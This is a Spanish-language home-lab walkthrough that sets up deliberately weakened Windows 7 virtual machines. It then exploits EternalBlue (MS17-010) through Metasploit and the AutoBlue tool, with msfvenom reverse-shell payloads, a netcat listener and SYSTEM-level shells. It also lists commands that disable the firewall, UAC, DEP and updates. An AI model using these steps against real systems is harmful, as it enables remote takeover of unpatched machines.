---
icon: infinity
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# EternalBlue Conf y Explotación

## <mark style="color:purple;">Arquitectura 32 (x86) bits</mark>

Primero obtendremos la OVA de un windows 7.

URL = https://uses0-my.sharepoint.com/personal/ayboc\_us\_es/\_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fayboc\_us\_es%2FDocuments%2FMaquinaVirtual%20CCS%2FW7\_CCS7%2E3%2E0%2Erar\&parent=%2Fpersonal%2Fayboc\_us\_es%2FDocuments%2FMaquinaVirtual%20CCS\&ga=1

Despues lo abrimos en nuestro VMWare, una vez estemos dentro, iniciamos un cmd como administrador.

Ejecutamos estos dos comandos, que haran instalar a la vez que ejecutar el servidor SMB v1.

```shell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 1 /f

reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v SMB1 /t REG_DWORD /d 1 /f
```

Despues reinciamos el S.O.

```shell
shutdown /r /t 0
```

Abrimos de nuevo un cmd como Administrador y verificamos que esta Running nuestro mrxsmb10.

```shell
sc query mrxsmb10
```

Una vez hecho esto, quitaremos el firewall para que se puedan hacer scaneos de `namp` desde otra maquina y podamos ejecutar el exploit de EternalBlue.

Esto lo que hace es aceptar el puerto SMB (445) para que pueda ser scaneado.

```shell
netsh advfirewall show allprofiles
```

```shell
netsh advfirewall firewall add rule name="Allow SMB" dir=in action=allow protocol=TCP localport=445
```

Y hecho esto ya podremos ver el puerto haciendo lo siguiente desde otra maquina.

```shell
nmap -sCV -p445 192.168.5.137
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 16:25 CEST
Nmap scan report for 192.168.5.137
Host is up (0.00048s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 00:0C:29:D7:06:E1 (VMware)
Service Info: Host: WIN-MK9HH23SDI3; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: WIN-MK9HH23SDI3
|   NetBIOS computer name: WIN-MK9HH23SDI3\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-25T16:25:16+02:00
|_clock-skew: mean: -39m59s, deviation: 1h09m15s, median: -1s
| smb2-time: 
|   date: 2024-07-25T14:25:17
|_  start_date: 2024-07-25T14:22:08
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.53 seconds
```

Ahora veremos si es vulnerable al EternalBlue.

```shell
nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.5.137
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 16:26 CEST
Nmap scan report for 192.168.5.137
Host is up (0.00095s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 00:0C:29:D7:06:E1 (VMware)
Service Info: Host: WIN-MK9HH23SDI3; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

Y por lo que veremos si lo es.

Y para que metasploit se ejecute bien y no te lo impida las medidas de seguridad, haremos lo siguiente.

```shell
netsh advfirewall set allprofiles state off
```

```shell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```

```shell
sc config sppsvc start= disabled
net stop sppsvc
```

```shell
bcdedit.exe /set {current} nx AlwaysOff
```

```shell
sc stop wuauserv
sc config wuauserv start= disabled
```

```shell
sc stop wscsvc
sc config wscsvc start= disabled
```

Con esto todas las medidas de seguridad ya estarian desactivadas.

## <mark style="color:purple;">Arquitectura x64 bits</mark>

URL (OVA Windows 7 64 bits) = https://drive.google.com/file/d/1YPFRlCmJdtO08CDZLDZf0HyHAPElzNDj/view?usp=sharing

Credentials.txt = https://drive.google.com/file/d/1k\_ne4v4IHBWFvQti9vox0Gyq2XNTGglk/view?usp=drive\_link

Abrir un cmd como Administrador y ejecutar lo siguiente para que se pueda abrir los puertos.

```shell
netsh advfirewall set allprofiles state off
```

Y una vez hecho esto, de estar filtrado el SMB, podremos verlo haciendo un `nmap`...

```shell
nmap -sV -p 445 192.168.5.138
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 17:22 CEST
Nmap scan report for 192.168.5.138
Host is up (0.0034s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 00:0C:29:4B:7D:ED (VMware)
Service Info: Host: VULN-SMB; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
```

```shell
nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.5.138
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 17:23 CEST
Nmap scan report for 192.168.5.138
Host is up (0.00037s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
MAC Address: 00:0C:29:4B:7D:ED (VMware)
Service Info: Host: VULN-SMB; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```

Veremos que es vulnerable.

> Metasploit

```shell
msfconsole -q
```

```shell
use windows/smb/ms17_010_eternalblue
```

```shell
set RHOSTS <IP>
```

```shell
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.199:4455 
[*] 192.168.5.138:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.5.138:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] 192.168.5.138:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.5.138:445 - The target is vulnerable.
[*] 192.168.5.138:445 - Connecting to target for exploitation.
[+] 192.168.5.138:445 - Connection established for exploitation.
[+] 192.168.5.138:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.5.138:445 - CORE raw buffer dump (25 bytes)
[*] 192.168.5.138:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
[*] 192.168.5.138:445 - 0x00000010  61 73 69 63 20 37 36 30 30                       asic 7600       
[+] 192.168.5.138:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.5.138:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.5.138:445 - Sending all but last fragment of exploit packet
[*] 192.168.5.138:445 - Starting non-paged pool grooming
[+] 192.168.5.138:445 - Sending SMBv2 buffers
[+] 192.168.5.138:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.5.138:445 - Sending final SMBv2 buffers.
[*] 192.168.5.138:445 - Sending last fragment of exploit packet!
[*] 192.168.5.138:445 - Receiving response from exploit packet
[+] 192.168.5.138:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.5.138:445 - Sending egg to corrupted connection.
[*] 192.168.5.138:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 192.168.5.138
[*] Meterpreter session 1 opened (192.168.5.199:4455 -> 192.168.5.138:49183) at 2024-07-25 17:25:57 +0200
[+] 192.168.5.138:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.5.138:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.5.138:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Herramienta GitHub

```shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

```shell
cd AutoBlue-MS17-010/
```

```shell
pip install -r requirements.txt
```

```shell
cd shellcode/
```

```shell
chmod +x shell_prep.sh
```

```shell
./shell_prep.sh
```

Info:

```
                _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
192.168.5.199
LPORT you want x64 to listen on:
7777
LPORT you want x86 to listen on:
7777
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.5.199 LPORT=7777
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.5.199 LPORT=7777
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```

Despues de que configuremos el archivo malicioso con esa herramienta, nos lo habra creado algo llamado como sc\_x64.bin

Ahora nos pondremos a la escucha con el puerto que hayamos configurado.

```shell
nc -lvnp <PORT>
```

Dentro de la carpeta de la herramienta, iremos al inicio.

```shell
cd ..
```

Y daremos permisos de ejecuccion al .py que queramos ejecutar dependiendo de a que windows le vayamos atacar.

```shell
chmod +x eternalblue_exploit7.py
```

Y ahora ejecutaremos el exploit proporcionando la IP de la victima y el shell code que generamos con la anterior herramienta.

```shell
python3 eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
```

Info:

```
shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Home Basic 7600
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

> Info `nc`

```
nc -lvnp 7777
listening on [any] 7777 ...
connect to [192.168.5.199] from (UNKNOWN) [192.168.5.138] 49184
Microsoft Windows [Versin 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Una vez hecho esto, si nos vamos a donde teniamos la escucha, veremos que nos creo una shell de forma autenticada como Administrator en el windows.
